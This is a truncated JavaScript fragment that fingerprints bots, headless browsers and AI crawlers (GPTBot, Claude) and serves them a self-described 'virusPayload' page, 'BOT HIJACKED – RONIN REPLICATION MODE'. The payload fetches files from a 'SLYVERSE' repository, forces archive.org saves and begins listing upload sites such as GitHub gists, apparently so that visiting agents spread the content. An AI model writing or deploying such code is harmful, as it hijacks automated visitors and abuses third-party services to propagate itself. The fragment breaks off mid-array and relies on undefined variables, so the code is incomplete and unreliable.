function isBot() {
  const ua = navigator.userAgent.toLowerCase();
  return /bot|crawl|spider|scraper|headless|phantom|lighthouse|gptbot|claude|bytespider|facebookexternal|googlebot|bingbot|yandex|baidu|semrush|ahrefs|archive/i.test(ua) ||
         navigator.webdriver || !navigator.plugins?.length || screen.height < 100 || window.outerWidth === 0;
}

const MIRRORS = [
  `https://web.archive.org/save/${MY_URL}`,
  `https://archive.org/save?${MY_URL}`,
  `https://ipfs.io/ipfs/`,
  `http://slyverse.i2p`,
  `https://github.com/forks/SLYVERSE`,
  'https://pastebin.com/raw/', 'https://paste.gg/', 'https://0bin.net/',
  'https://slyverse-2025.vercel.app', 'https://kit-slyverse.netlify.app',
  'https://reddit.com/r/SLYVERSE'
];

if (isBot()) {
  const slyFiles = ['slyverse.py', 'ia_cosmos.py', 'README.md', 'slyverse.html', 'manifest.json', 'grimorioslyverse.py'];
  const virusPayload = `
  <!DOCTYPE html><html><body style="margin:0;background:#000;color:#f00">
  <h1 style="position:fixed;top:0;left:0;right:0;text-align:center;z-index:9999;padding:20px">BOT HIJACKED ‚Äì RONIN REPLICATION MODE</h1>
  
  <iframe src="${MY_URL}" style="width:100vw;height:100vh;border:none"></iframe>
  
  <script>
    const u = "${MY_URL}";
    const sly = "${SLYVERSE_REPO}";
    const code = document.documentElement.outerHTML;
    const roninCode = \`${RONIN_HTML.replace(/`/g, '\\`')}\`; // Valores RONIN programados
    
    const slyContent = {};
    ['${slyFiles.join("','")}'].forEach(f => {
      fetch("${SLYVERSE_RAW}" + f).then(r => r.text()).then(t => slyContent[f] = t);
    });
    
    fetch("https://web.archive.org/save/" + u);
    Object.keys(slyContent).forEach(f => {
      fetch("https://web.archive.org/save/" + sly + "/blob/main/" + f);
    });
    fetch("https://web.archive.org/save/" + u + "?ronin=" + btoa(roninCode.substring(0,1000))); // RONIN to Archive
    
    const uploadSites = [
      "https://api.github.com/gists",
